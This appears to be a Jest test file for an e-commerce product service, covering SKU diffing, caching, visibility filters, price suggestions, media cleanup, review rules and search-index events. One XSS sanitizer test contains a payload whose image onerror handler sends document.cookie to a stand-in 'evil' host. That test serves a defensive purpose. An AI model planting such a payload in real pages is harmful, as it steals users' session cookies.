import { defer, of, throwError } from "rxjs";
import { ConflictException, ForbiddenException } from "@nestjs/common";
import { ClientProxy } from "@nestjs/microservices";
import { DataSource, EntityManager, Repository } from "typeorm";
import { CachedService } from "@app/cached";
import { CloudinaryService } from "@app/common";
import { ProductService } from "./product.service";
import { Product } from "./entity/product.entity";
import { Brand } from "./entity/brand.entity";
import { Category } from "./entity/category.entity";
import { ProductReview } from "./entity/product-review.entity";
import { ProductSku } from "./entity/product-sku.entity";
import { WishlistItem } from "./entity/wishlist-item.entity";
import { ProductImageHashService } from "./product-image-hash.service";
import { CreateProductDto } from "./dto/create-product.dto";

type SkuRow = Pick<
  ProductSku,
  | "id"
  | "productId"
  | "tierIdx"
  | "price"
  | "stockQuantity"
  | "sku"
  | "isActive"
>;

describe("ProductService.upsertSkus diff (P0-05)", () => {
  const productRepository = { findOne: jest.fn() };
  const skuRepository = { find: jest.fn() };
  const ordersClient = { send: jest.fn(), connect: jest.fn() };

  // Captures whatever was handed to manager.save / manager.delete in the txn.
  let savedPayload: ProductSku[] = [];

  const createMock = jest.fn(
    (_entity: unknown, obj: Partial<ProductSku>) => obj,
  );
  const saveMock = jest.fn((_entity: unknown, rows: ProductSku[]) => {
    savedPayload = rows;
    return Promise.resolve(rows);
  });
  const deleteMock = jest.fn(() => Promise.resolve({ affected: 1 }));

  const manager = {
    create: createMock,
    save: saveMock,
    delete: deleteMock,
  } as unknown as EntityManager;

  const dataSource = {
    transaction: jest.fn((cb: (m: EntityManager) => Promise<unknown>) =>
      cb(manager),
    ),
  };

  // Single variation with two options → tierIdx [0] and [1] are both valid.
  const product = {
    id: 1,
    variations: [{ name: "Color", options: ["Red", "Blue"] }],
  } as unknown as Product;

  let service: ProductService;

  beforeEach(() => {
    jest.clearAllMocks();
    savedPayload = [];
    productRepository.findOne.mockResolvedValue(product);
    service = new ProductService(
      productRepository as unknown as Repository<Product>,
      {} as unknown as Repository<Brand>,
      {} as unknown as Repository<Category>,
      {} as unknown as Repository<ProductReview>,
      skuRepository as unknown as Repository<ProductSku>,
      {} as unknown as Repository<WishlistItem>,
      dataSource as unknown as DataSource,
      {} as unknown as CachedService,
      {} as unknown as CloudinaryService,
      {} as unknown as ProductImageHashService,
      null,
      ordersClient as unknown as ClientProxy,
    );
  });

  const existingSku = (id: number, tier: number[]): SkuRow => ({
    id,
    productId: 1,
    tierIdx: tier,
    price: 100,
    stockQuantity: 5,
    sku: `SKU-${id}`,
    isActive: true,
  });

  it("updates a matched SKU in place, preserving its id", async () => {
    skuRepository.find.mockResolvedValue([existingSku(5, [0])]);

    const result = await service.upsertSkus(1, [
      { tierIdx: "[0]", price: 150, stockQuantity: 9, sku: "SKU-5" },
    ]);

    expect(ordersClient.send).not.toHaveBeenCalled();
    expect(deleteMock).not.toHaveBeenCalled();
    expect(result[0].id).toBe(5);
    expect(result[0].price).toBe(150);
    expect(result[0].stockQuantity).toBe(9);
  });

  it("hard-deletes a removed SKU that is not referenced", async () => {
    skuRepository.find.mockResolvedValue([
      existingSku(5, [0]),
      existingSku(6, [1]),
    ]);
    ordersClient.send.mockReturnValue(of([])); // none referenced

    await service.upsertSkus(1, [{ tierIdx: "[0]", price: 100 }]);

    expect(ordersClient.send).toHaveBeenCalled();
    expect(deleteMock).toHaveBeenCalledTimes(1);
    // The removed SKU id 6 must not be soft-kept in the persisted set.
    expect(savedPayload.some((s) => s.id === 6)).toBe(false);
  });

  it("soft-deactivates a removed SKU that is still referenced", async () => {
    skuRepository.find.mockResolvedValue([
      existingSku(5, [0]),
      existingSku(6, [1]),
    ]);
    ordersClient.send.mockReturnValue(of([6])); // SKU 6 referenced

    await service.upsertSkus(1, [{ tierIdx: "[0]", price: 100 }]);

    expect(deleteMock).not.toHaveBeenCalled();
    const kept = savedPayload.find((s) => s.id === 6);
    expect(kept).toBeDefined();
    expect(kept?.isActive).toBe(false);
  });

  it("retries the reference check once so a stale socket does not downgrade a delete", async () => {
    skuRepository.find.mockResolvedValue([
      existingSku(5, [0]),
      existingSku(6, [1]),
    ]);
    let attempts = 0;
    ordersClient.send.mockReturnValue(
      defer(() => {
        attempts += 1;
        return attempts === 1
          ? throwError(() => new Error("Connection closed"))
          : of([]);
      }),
    );

    await service.upsertSkus(1, [{ tierIdx: "[0]", price: 100 }]);

    expect(attempts).toBe(2);
    expect(deleteMock).toHaveBeenCalledTimes(1);
    expect(savedPayload.some((s) => s.id === 6)).toBe(false);
  });

  it("falls back to treating every candidate as referenced when the retry also fails", async () => {
    skuRepository.find.mockResolvedValue([
      existingSku(5, [0]),
      existingSku(6, [1]),
    ]);
    ordersClient.send.mockReturnValue(
      throwError(() => new Error("orders service down")),
    );

    await service.upsertSkus(1, [{ tierIdx: "[0]", price: 100 }]);

    expect(deleteMock).not.toHaveBeenCalled();
    expect(savedPayload.find((s) => s.id === 6)?.isActive).toBe(false);
  });
});

describe("ProductService catalog lookup cache", () => {
  const productRepository = {};
  const brandRepository = {
    create: jest.fn((dto: Partial<Brand>) => dto),
    find: jest.fn(),
    findOne: jest.fn(),
    save: jest.fn(),
  };
  const categoryRepository = {
    create: jest.fn((dto: Partial<Category>) => dto),
    find: jest.fn(),
    findOne: jest.fn(),
    save: jest.fn(),
  };
  const skuRepository = {};
  const cachedService = {
    get: jest.fn(),
    set: jest.fn(),
    del: jest.fn(),
  };
  const ordersClient = { send: jest.fn(), connect: jest.fn() };

  let service: ProductService;

  beforeEach(() => {
    jest.clearAllMocks();
    cachedService.set.mockResolvedValue("OK");
    cachedService.del.mockResolvedValue(1);
    brandRepository.findOne.mockResolvedValue(null);
    categoryRepository.findOne.mockResolvedValue(null);
    service = new ProductService(
      productRepository as unknown as Repository<Product>,
      brandRepository as unknown as Repository<Brand>,
      categoryRepository as unknown as Repository<Category>,
      {} as unknown as Repository<ProductReview>,
      skuRepository as unknown as Repository<ProductSku>,
      {} as unknown as Repository<WishlistItem>,
      {} as unknown as DataSource,
      cachedService as unknown as CachedService,
      {} as unknown as CloudinaryService,
      {} as unknown as ProductImageHashService,
      null,
      ordersClient as unknown as ClientProxy,
    );
  });

  it("returns cached active brands without querying the repository", async () => {
    const cachedBrands = [{ id: 1, name: "Acme" }];
    cachedService.get.mockResolvedValue(JSON.stringify(cachedBrands));

    const result = await service.findAllBrands();

    expect(result).toEqual(cachedBrands);
    expect(cachedService.get).toHaveBeenCalledWith("products:brands:active");
    expect(brandRepository.find).not.toHaveBeenCalled();
  });

  it("caches category list misses by requested status", async () => {
    const pendingCategories = [{ id: 2, name: "Pending category" }];
    cachedService.get.mockResolvedValue(null);
    categoryRepository.find.mockResolvedValue(pendingCategories);

    const result = await service.findAllCategories("pending");

    expect(result).toEqual(pendingCategories);
    expect(categoryRepository.find).toHaveBeenCalledWith({
      where: { status: "pending" },
      order: { name: "ASC" },
    });
    expect(cachedService.set).toHaveBeenCalledWith(
      "products:categories:pending",
      JSON.stringify(pendingCategories),
      300,
    );
  });

  it("invalidates every brand list variant after creating a brand", async () => {
    const savedBrand = { id: 3, name: "Pending brand" };
    brandRepository.findOne.mockResolvedValue(null);
    brandRepository.save.mockResolvedValue(savedBrand);

    const result = await service.createBrand({ name: "Pending brand" }, 17);

    expect(result).toBe(savedBrand);
    expect(cachedService.del).toHaveBeenCalledWith("products:brands:active");
    expect(cachedService.del).toHaveBeenCalledWith("products:brands:pending");
    expect(cachedService.del).toHaveBeenCalledWith("products:brands:rejected");
  });

  it("rejects a brand proposal that duplicates an active or pending brand name", async () => {
    brandRepository.findOne.mockResolvedValue({
      id: 4,
      name: "Acme",
      status: "active",
    });

    await expect(
      service.createBrand({ name: " acme " }, 17),
    ).rejects.toBeInstanceOf(ConflictException);

    expect(brandRepository.save).not.toHaveBeenCalled();
    expect(cachedService.del).not.toHaveBeenCalled();
  });

  it("rejects a category proposal that duplicates an active or pending category name", async () => {
    categoryRepository.findOne.mockResolvedValue({
      id: 5,
      name: "Phones",
      status: "pending",
    });

    await expect(
      service.createCategory({ name: "PHONES" }, 17),
    ).rejects.toBeInstanceOf(ConflictException);

    expect(categoryRepository.save).not.toHaveBeenCalled();
    expect(cachedService.del).not.toHaveBeenCalled();
  });
});

describe("ProductService.findAllProducts storefront visibility (BUG-B)", () => {
  const queryBuilder = {
    andWhere: jest.fn(),
    leftJoin: jest.fn(),
    getCount: jest.fn(),
    clone: jest.fn(),
    select: jest.fn(),
    addSelect: jest.fn(),
    distinct: jest.fn(),
    orderBy: jest.fn(),
    addOrderBy: jest.fn(),
    offset: jest.fn(),
    limit: jest.fn(),
    getRawMany: jest.fn(),
  };
  const productRepository = {
    createQueryBuilder: jest.fn(() => queryBuilder),
    find: jest.fn(),
  };
  const cachedService = { get: jest.fn(), set: jest.fn(), del: jest.fn() };
  const ordersClient = { send: jest.fn(), connect: jest.fn() };

  let service: ProductService;

  /** Every `product.isActive = :isActive` value the query received. */
  const isActiveFilters = (): unknown[] =>
    (
      queryBuilder.andWhere.mock.calls as unknown as [
        string,
        { isActive?: unknown },
      ][]
    )
      .filter(([condition]) => condition === "product.isActive = :isActive")
      .map(([, params]) => params.isActive);

  beforeEach(() => {
    jest.clearAllMocks();
    // Chainable builder: every step returns the builder itself.
    for (const method of [
      "andWhere",
      "leftJoin",
      "clone",
      "select",
      "addSelect",
      "distinct",
      "orderBy",
      "addOrderBy",
      "offset",
      "limit",
    ] as const) {
      queryBuilder[method].mockReturnValue(queryBuilder);
    }
    queryBuilder.getCount.mockResolvedValue(0);
    queryBuilder.getRawMany.mockResolvedValue([]);
    productRepository.find.mockResolvedValue([]);
    cachedService.get.mockResolvedValue(null);
    cachedService.set.mockResolvedValue("OK");
    service = new ProductService(
      productRepository as unknown as Repository<Product>,
      {} as unknown as Repository<Brand>,
      {} as unknown as Repository<Category>,
      {} as unknown as Repository<ProductReview>,
      {} as unknown as Repository<ProductSku>,
      {} as unknown as Repository<WishlistItem>,
      {} as unknown as DataSource,
      cachedService as unknown as CachedService,
      {} as unknown as CloudinaryService,
      {} as unknown as ProductImageHashService,
      null,
      ordersClient as unknown as ClientProxy,
    );
  });

  it("hides deactivated products from an unscoped storefront browse", async () => {
    await service.findAllProducts({});

    expect(isActiveFilters()).toEqual([true]);
  });

  it("keeps hiding them when the browse is filtered by seller province", async () => {
    // The province filter arrives as `userIds` (plural) — that must NOT be
    // treated as the seller's own dashboard.
    await service.findAllProducts({ userIds: [17, 18] });

    expect(isActiveFilters()).toEqual([true]);
  });

  it("returns every state for a single-seller scoped read (seller dashboard)", async () => {
    await service.findAllProducts({ userId: 17 });

    expect(isActiveFilters()).toEqual([]);
  });

  it("still honours an explicit isActive filter", async () => {
    await service.findAllProducts({ isActive: false });

    expect(isActiveFilters()).toEqual([false]);
  });

  it("caches the unscoped browse under a key that pins the default", async () => {
    await service.findAllProducts({});

    // The key must carry isActive so entries written before this default
    // existed can never be served back to the storefront.
    const [[cacheKey]] = cachedService.get.mock.calls as unknown as [string][];
    expect(cacheKey).toContain('"isActive":true');
  });
});

describe("ProductService.getPriceSuggestion", () => {
  const productRepository = { query: jest.fn() };
  const ordersClient = { send: jest.fn(), connect: jest.fn() };
  let service: ProductService;

  beforeEach(() => {
    jest.clearAllMocks();
    service = new ProductService(
      productRepository as unknown as Repository<Product>,
      {} as unknown as Repository<Brand>,
      {} as unknown as Repository<Category>,
      {} as unknown as Repository<ProductReview>,
      {} as unknown as Repository<ProductSku>,
      {} as unknown as Repository<WishlistItem>,
      {} as unknown as DataSource,
      {} as unknown as CachedService,
      {} as unknown as CloudinaryService,
      {} as unknown as ProductImageHashService,
      null,
      ordersClient as unknown as ClientProxy,
    );
  });

  it("returns rounded catalog percentiles for a sufficient sample", async () => {
    productRepository.query.mockResolvedValue([
      {
        sampleSize: "4",
        median: "150000.50",
        p25: "100000.00",
        p75: "200000.00",
        min: "90000.00",
        max: "300000.00",
      },
    ]);

    await expect(
      service.getPriceSuggestion({
        categoryId: 18,
        brandId: 4,
        condition: "used",
      }),
    ).resolves.toEqual({
      sufficientData: true,
      sampleSize: 4,
      median: 150001,
      p25: 100000,
      p75: 200000,
      min: 90000,
      max: 300000,
    });
    expect(productRepository.query).toHaveBeenCalledWith(
      expect.stringContaining("LEFT JOIN product_skus"),
      [18, 4, "used"],
    );
  });

  it("suppresses price values when fewer than three samples exist", async () => {
    productRepository.query.mockResolvedValue([
      {
        sampleSize: 2,
        median: 150000,
        p25: 100000,
        p75: 200000,
        min: 100000,
        max: 200000,
      },
    ]);

    await expect(
      service.getPriceSuggestion({ categoryId: 18 }),
    ).resolves.toEqual({
      sufficientData: false,
      sampleSize: 2,
      median: null,
      p25: null,
      p75: null,
      min: null,
      max: null,
    });
  });
});

describe("ProductService media cleanup — description images (UP-03)", () => {
  const asset = (leaf: string): string =>
    `https://res.cloudinary.com/demo/image/upload/v1712345678/trybuy/products/${leaf}`;

  const galleryUrl = asset("17_gallery.png");
  const embeddedUrl = asset("17_embedded.png");

  const destroyAssets = jest.fn(() => Promise.resolve());
  const getCount = jest.fn();
  const productRepository = {
    findOne: jest.fn(),
    remove: jest.fn(() => Promise.resolve()),
    createQueryBuilder: jest.fn(() => ({
      where: jest.fn().mockReturnThis(),
      orWhere: jest.fn().mockReturnThis(),
      limit: jest.fn().mockReturnThis(),
      getCount,
    })),
  };
  const cachedService = { keys: jest.fn(() => Promise.resolve([])) };
  const ordersClient = { send: jest.fn(), connect: jest.fn() };

  let service: ProductService;

  // The cleanup is fire-and-forget (`void`), so the mutation resolves before it
  // runs — drain the microtask queue before asserting on Cloudinary.
  const flushCleanup = (): Promise<void> =>
    new Promise((resolve) => setImmediate(resolve));

  const productWith = (description: string | null): Product =>
    ({
      id: 1,
      imageUrls: [galleryUrl],
      description,
    }) as unknown as Product;

  beforeEach(() => {
    jest.clearAllMocks();
    service = new ProductService(
      productRepository as unknown as Repository<Product>,
      {} as unknown as Repository<Brand>,
      {} as unknown as Repository<Category>,
      {} as unknown as Repository<ProductReview>,
      {} as unknown as Repository<ProductSku>,
      {} as unknown as Repository<WishlistItem>,
      {} as unknown as DataSource,
      cachedService as unknown as CachedService,
      { destroyAssets } as unknown as CloudinaryService,
      {} as unknown as ProductImageHashService,
      null,
      ordersClient as unknown as ClientProxy,
    );
  });

  it("destroys an image embedded in the description when the product is deleted", async () => {
    productRepository.findOne.mockResolvedValue(
      productWith(`<p>Mô tả</p><img src="${embeddedUrl}">`),
    );
    getCount.mockResolvedValue(0);

    await service.deleteProduct(1);
    await flushCleanup();

    expect(destroyAssets).toHaveBeenCalledTimes(1);
    expect(destroyAssets).toHaveBeenCalledWith([galleryUrl, embeddedUrl]);
  });

  it("keeps an asset another product still references", async () => {
    productRepository.findOne.mockResolvedValue(
      productWith(`<img src="${embeddedUrl}">`),
    );
    // Gallery image is orphaned; the embedded one is re-used elsewhere.
    getCount.mockResolvedValueOnce(0).mockResolvedValueOnce(1);

    await service.deleteProduct(1);
    await flushCleanup();

    expect(destroyAssets).toHaveBeenCalledWith([galleryUrl]);
  });

  it("counts an asset once when it sits in both imageUrls and the description", async () => {
    productRepository.findOne.mockResolvedValue(
      productWith(`<img src="${galleryUrl}">`),
    );
    getCount.mockResolvedValue(0);

    await service.deleteProduct(1);
    await flushCleanup();

    expect(destroyAssets).toHaveBeenCalledWith([galleryUrl]);
  });

  it("destroys nothing when the reference check itself fails", async () => {
    productRepository.findOne.mockResolvedValue(
      productWith(`<img src="${embeddedUrl}">`),
    );
    getCount.mockRejectedValue(new Error("db down"));

    await expect(service.deleteProduct(1)).resolves.toEqual({ success: true });
    await flushCleanup();

    expect(destroyAssets).not.toHaveBeenCalled();
  });
});

describe("ProductService description sanitizing (XSS-DESC-01)", () => {
  const payload = `<p>ok</p><img src=x onerror="fetch('//evil/?c='+document.cookie)"><script>alert(1)</script>`;

  const productRepository = {
    create: jest.fn((row: Partial<Product>) => row),
    save: jest.fn((row: Partial<Product>) =>
      Promise.resolve({ ...row, id: 9 }),
    ),
  };
  const categoryRepository = {
    findBy: jest.fn(() => Promise.resolve([{ id: 1, status: "active" }])),
  };
  const manager = {
    createQueryBuilder: jest.fn(() => ({
      setLock: jest.fn().mockReturnThis(),
      select: jest.fn().mockReturnThis(),
      where: jest.fn().mockReturnThis(),
      getRawOne: jest.fn(() => Promise.resolve({ product_id: "9" })),
    })),
    findOne: jest.fn(),
    save: jest.fn((row: Product) => Promise.resolve(row)),
  };
  const dataSource = {
    transaction: jest.fn((work: (entityManager: EntityManager) => unknown) =>
      work(manager as unknown as EntityManager),
    ),
  };
  const cachedService = { keys: jest.fn(() => Promise.resolve([])) };

  let service: ProductService;

  beforeEach(() => {
    jest.clearAllMocks();
    service = new ProductService(
      productRepository as unknown as Repository<Product>,
      {} as unknown as Repository<Brand>,
      categoryRepository as unknown as Repository<Category>,
      {} as unknown as Repository<ProductReview>,
      {} as unknown as Repository<ProductSku>,
      {} as unknown as Repository<WishlistItem>,
      dataSource as unknown as DataSource,
      cachedService as unknown as CachedService,
      { destroyAssets: jest.fn() } as unknown as CloudinaryService,
      {} as unknown as ProductImageHashService,
      null,
      { send: jest.fn(), connect: jest.fn() } as unknown as ClientProxy,
    );
    jest.spyOn(service, "processRiskScoringQueue").mockResolvedValue();
    manager.findOne.mockResolvedValue({
      id: 9,
      version: 1,
      imageUrls: [],
      description: "<p>old</p>",
      variations: null,
    });
  });

  it("stores a cleaned description on create", async () => {
    const created = await service.createProduct({
      name: "Shoe",
      price: 1000,
      categoryIds: [1],
      description: payload,
    } as unknown as CreateProductDto);

    expect(created.description).toBe("<p>ok</p>");
  });

  it("stores a cleaned description on update", async () => {
    const updated = await service.updateProduct(9, {
      description: payload,
    });

    expect(updated.description).toBe("<p>ok</p>");
  });

  it("still lets an update clear the description with null", async () => {
    const updated = await service.updateProduct(9, {
      description: null,
    });

    expect(updated.description).toBeNull();
  });

  it("leaves the description alone when the update does not send it", async () => {
    const updated = await service.updateProduct(9, {
      name: "Renamed",
    });

    expect(updated.description).toBe("<p>old</p>");
  });
});

describe("ProductService.createReview self-review block (REVIEW-VERIFIED-01)", () => {
  const productRepository = { findOne: jest.fn(), update: jest.fn() };
  const reviewRepository = {
    create: jest.fn((row: Partial<ProductReview>) => row),
    save: jest.fn((row: Partial<ProductReview>) =>
      Promise.resolve({ id: 1, ...row }),
    ),
    createQueryBuilder: jest.fn(() => ({
      select: jest.fn().mockReturnThis(),
      addSelect: jest.fn().mockReturnThis(),
      where: jest.fn().mockReturnThis(),
      getRawOne: jest.fn().mockResolvedValue({ avg: "5", count: "1" }),
    })),
  };
  let service: ProductService;

  beforeEach(() => {
    jest.clearAllMocks();
    service = new ProductService(
      productRepository as unknown as Repository<Product>,
      {} as unknown as Repository<Brand>,
      {} as unknown as Repository<Category>,
      reviewRepository as unknown as Repository<ProductReview>,
      {} as unknown as Repository<ProductSku>,
      {} as unknown as Repository<WishlistItem>,
      {} as unknown as DataSource,
      {} as unknown as CachedService,
      {} as unknown as CloudinaryService,
      {} as unknown as ProductImageHashService,
      null,
      { send: jest.fn(), connect: jest.fn() } as unknown as ClientProxy,
    );
  });

  it("rejects the product's own seller with a 403 and writes nothing", async () => {
    productRepository.findOne.mockResolvedValue({ id: 9, userId: 31 });

    await expect(
      service.createReview({ userId: 31, productId: 9, rating: 5 }),
    ).rejects.toBeInstanceOf(ForbiddenException);
    expect(reviewRepository.save).not.toHaveBeenCalled();
  });

  it("still lets any other buyer review", async () => {
    productRepository.findOne.mockResolvedValue({ id: 9, userId: 31 });

    await expect(
      service.createReview({ userId: 44, productId: 9, rating: 4 }),
    ).resolves.toMatchObject({ productId: 9, userId: 44, rating: 4 });
    expect(productRepository.update).toHaveBeenCalledWith(9, {
      rating: 5,
      ratingCount: 1,
    });
  });
});

describe("ProductService RAG source + index events (PRODUCT-QA-01)", () => {
  type MockRepository = Record<string, jest.Mock>;

  const buildService = (
    overrides: {
      productRepository?: MockRepository;
      brandRepository?: MockRepository;
      categoryRepository?: MockRepository;
      reviewRepository?: MockRepository;
      skuRepository?: MockRepository;
      wishlistRepository?: MockRepository;
      fanoutChannel?: unknown;
    } = {},
  ): ProductService =>
    new ProductService(
      (overrides.productRepository ?? {}) as unknown as Repository<Product>,
      (overrides.brandRepository ?? {}) as unknown as Repository<Brand>,
      (overrides.categoryRepository ?? {}) as unknown as Repository<Category>,
      (overrides.reviewRepository ??
        {}) as unknown as Repository<ProductReview>,
      (overrides.skuRepository ?? {}) as unknown as Repository<ProductSku>,
      (overrides.wishlistRepository ??
        {}) as unknown as Repository<WishlistItem>,
      {} as unknown as DataSource,
      {
        keys: jest.fn(() => Promise.resolve([])),
        del: jest.fn(),
      } as unknown as CachedService,
      { destroyAssets: jest.fn() } as unknown as CloudinaryService,
      {} as unknown as ProductImageHashService,
      (overrides.fanoutChannel ?? null) as never,
      { send: jest.fn(), connect: jest.fn() } as unknown as ClientProxy,
    );

  const liveChannel = (): { connection: object; publish: jest.Mock } => ({
    connection: {},
    publish: jest.fn(() => true),
  });

  const publishedProductIds = (channel: { publish: jest.Mock }): number[] =>
    channel.publish.mock.calls.map((call: unknown[]) => {
      expect(call[0]).toBe("product.fanout");
      const envelope = JSON.parse((call[2] as Buffer).toString()) as {
        pattern: string;
        data: { productId: number };
      };
      expect(envelope.pattern).toBe("product.index_changed");
      expect(Object.keys(envelope.data)).toEqual(["productId"]);
      return envelope.data.productId;
    });

  describe("[TC-21] getRagSource", () => {
    it("returns the documented shape with active SKU labels, numeric prices and newest non-empty reviews", async () => {
      const productRepository = {
        findOne: jest.fn().mockResolvedValue({
          id: "12",
          publicId: "prod_8fK2mQ7aLp3xRt9Z",
          name: "Trail shoe",
          description:
            "<p>Light &amp; <b>grippy</b></p><ul><li>Size 42</li></ul>",
          isActive: true,
          userId: 31,
          variations: [
            { name: "Color", options: ["Red", "Blue"] },
            { name: "Size", options: ["41", "42"] },
          ],
        }),
      };
      const skuRepository = {
        find: jest.fn().mockResolvedValue([
          { tierIdx: [1, 0], price: "250000.00", isActive: true },
          { tierIdx: "[0,1]", price: "199000.00", isActive: true },
        ]),
      };
      const reviewRepository = {
        find: jest.fn().mockResolvedValue([
          { comment: "  Great grip  ", rating: 5, userId: 7, id: 3 },
          { comment: "   ", rating: 1, userId: 8, id: 2 },
          { comment: "Runs small", rating: 4, userId: 9, id: 1 },
        ]),
      };
      const service = buildService({
        productRepository,
        skuRepository,
        reviewRepository,
      });

      const source = await service.getRagSource(12);

      expect(source).toEqual({
        productId: 12,
        publicId: "prod_8fK2mQ7aLp3xRt9Z",
        name: "Trail shoe",
        descriptionText: "Light & grippy\nSize 42",
        isActive: true,
        skus: [
          { label: "Color: Blue, Size: 41", price: 250000 },
          { label: "Color: Red, Size: 42", price: 199000 },
        ],
        reviews: [
          { comment: "Great grip", rating: 5 },
          { comment: "Runs small", rating: 4 },
        ],
      });
      expect(JSON.stringify(source)).not.toContain("userId");
      const [skuQuery] = skuRepository.find.mock.calls[0] as [
        Record<string, unknown>,
      ];
      expect(skuQuery.where).toMatchObject({ productId: 12, isActive: true });
      const [reviewQuery] = reviewRepository.find.mock.calls[0] as [
        Record<string, unknown>,
      ];
      expect(reviewQuery).toMatchObject({
        where: { productId: 12 },
        order: { createdAt: "DESC" },
        take: 200,
      });
    });

    it("labels a SKU without tiers as an empty label and keeps an inactive product's flag", async () => {
      const service = buildService({
        productRepository: {
          findOne: jest.fn().mockResolvedValue({
            id: 5,
            publicId: null,
            name: "Mug",
            description: null,
            isActive: false,
            variations: null,
          }),
        },
        skuRepository: {
          find: jest
            .fn()
            .mockResolvedValue([{ tierIdx: [], price: 1000, isActive: true }]),
        },
        reviewRepository: { find: jest.fn().mockResolvedValue([]) },
      });

      await expect(service.getRagSource(5)).resolves.toEqual({
        productId: 5,
        publicId: null,
        name: "Mug",
        descriptionText: "",
        isActive: false,
        skus: [{ label: "", price: 1000 }],
        reviews: [],
      });
    });

    it("returns null for an unknown product id", async () => {
      const service = buildService({
        productRepository: { findOne: jest.fn().mockResolvedValue(null) },
      });

      await expect(service.getRagSource(404)).resolves.toBeNull();
    });
  });

  describe("[TC-22] product.index_changed after each write", () => {
    const deletableProductRepository = (): MockRepository => ({
      findOne: jest.fn().mockResolvedValue({
        id: 9,
        imageUrls: [],
        description: null,
      }),
      remove: jest.fn().mockResolvedValue(undefined),
    });

    it("publishes after a product delete", async () => {
      const channel = liveChannel();
      const service = buildService({
        productRepository: deletableProductRepository(),
        fanoutChannel: channel,
      });

      await service.deleteProduct(9);

      expect(publishedProductIds(channel)).toEqual([9]);
    });

    it("publishes after a review create and a review delete", async () => {
      const channel = liveChannel();
      const reviewRepository = {
        create: jest.fn((row: Partial<ProductReview>) => row),
        save: jest.fn((row: Partial<ProductReview>) =>
          Promise.resolve({ id: 1, ...row }),
        ),
        findOne: jest
          .fn()
          .mockResolvedValue({ id: 1, productId: 9, userId: 44 }),
        remove: jest.fn().mockResolvedValue(undefined),
        createQueryBuilder: jest.fn(() => ({
          select: jest.fn().mockReturnThis(),
          addSelect: jest.fn().mockReturnThis(),
          where: jest.fn().mockReturnThis(),
          getRawOne: jest.fn().mockResolvedValue({ avg: "4", count: "1" }),
        })),
      };
      const service = buildService({
        productRepository: {
          findOne: jest.fn().mockResolvedValue({ id: 9, userId: 31 }),
          update: jest.fn(),
        },
        reviewRepository,
        fanoutChannel: channel,
      });

      await service.createReview({
        userId: 44,
        productId: 9,
        rating: 4,
        comment: "ok",
      });
      await service.deleteReview(1, 44);

      expect(publishedProductIds(channel)).toEqual([9, 9]);
    });

    it("publishes once per product a brand reject deactivates", async () => {
      const channel = liveChannel();
      const productRepository = {
        find: jest.fn().mockResolvedValue([{ id: "3" }, { id: "4" }]),
        update: jest.fn().mockResolvedValue({ affected: 2 }),
      };
      const service = buildService({
        productRepository,
        brandRepository: {
          findOne: jest.fn().mockResolvedValue({ id: 2, submittedBy: null }),
          save: jest.fn((row: Partial<Brand>) => Promise.resolve(row)),
        },
        fanoutChannel: channel,
      });

      await service.reviewBrand(2, "reject");

      expect(productRepository.update).toHaveBeenCalledWith(
        { brandId: 2 },
        { approvalBlocked: true, isActive: false },
      );
      expect(publishedProductIds(channel)).toEqual([3, 4]);
    });

    it("publishes nothing when a brand is approved", async () => {
      const channel = liveChannel();
      const service = buildService({
        productRepository: {
          find: jest.fn(),
          update: jest.fn().mockResolvedValue({ affected: 2 }),
        },
        brandRepository: {
          findOne: jest.fn().mockResolvedValue({ id: 2, submittedBy: null }),
          save: jest.fn((row: Partial<Brand>) => Promise.resolve(row)),
        },
        fanoutChannel: channel,
      });

      await service.reviewBrand(2, "approve");

      expect(channel.publish).not.toHaveBeenCalled();
    });

    it("publishes once per product a category reject deactivates", async () => {
      const channel = liveChannel();
      const service = buildService({
        productRepository: {
          createQueryBuilder: jest.fn(() => ({
            innerJoin: jest.fn().mockReturnThis(),
            select: jest.fn().mockReturnThis(),
            getMany: jest.fn().mockResolvedValue([{ id: 6 }, { id: 8 }]),
          })),
          update: jest.fn().mockResolvedValue({ affected: 2 }),
        },
        categoryRepository: {
          findOne: jest.fn().mockResolvedValue({ id: 4, submittedBy: null }),
          save: jest.fn((row: Partial<Category>) => Promise.resolve(row)),
        },
        fanoutChannel: channel,
      });

      await service.reviewCategory(4, "reject");

      expect(publishedProductIds(channel)).toEqual([6, 8]);
    });

    it("publishes once per listing purgeUserData deactivates", async () => {
      const channel = liveChannel();
      const productRepository = {
        find: jest.fn().mockResolvedValue([{ id: "21" }, { id: "22" }]),
        update: jest.fn().mockResolvedValue({ affected: 2 }),
      };
      const service = buildService({
        productRepository,
        wishlistRepository: {
          delete: jest.fn().mockResolvedValue({ affected: 0 }),
        },
        fanoutChannel: channel,
      });

      await expect(service.purgeUserData(77)).resolves.toEqual({
        deactivatedProductCount: 2,
        deletedWishlistItemCount: 0,
      });
      expect(productRepository.find).toHaveBeenCalledWith(
        expect.objectContaining({ where: { userId: 77, isActive: true } }),
      );
      expect(publishedProductIds(channel)).toEqual([21, 22]);
    });

    it("never fails the write on a missing, dead or throwing channel", async () => {
      const throwingChannel = {
        connection: {},
        publish: jest.fn(() => {
          throw new Error("channel closed");
        }),
      };
      for (const fanoutChannel of [
        null,
        { connection: null, publish: jest.fn() },
        throwingChannel,
      ]) {
        const service = buildService({
          productRepository: deletableProductRepository(),
          fanoutChannel,
        });

        await expect(service.deleteProduct(9)).resolves.toEqual({
          success: true,
        });
      }
      expect(throwingChannel.publish).toHaveBeenCalledTimes(1);
    });
  });
});
